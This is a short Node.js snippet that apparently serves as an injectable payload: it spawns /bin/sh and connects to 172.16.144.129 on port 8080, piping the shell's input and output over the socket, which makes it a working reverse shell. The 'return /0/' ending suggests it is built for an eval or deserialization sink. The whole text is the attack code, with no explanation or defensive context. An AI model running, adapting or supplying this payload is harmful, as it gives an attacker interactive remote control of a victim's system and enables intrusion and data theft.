(function(){
    var net = require('net'),
        cp = require('child_process'),
        sh = cp.spawn("/bin/sh", []);

    var client = new net.Socket()
    var IP = "172.16.144.129"
    client.connect(8080, IP, function(){

        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

    });
    return /0/;
})();
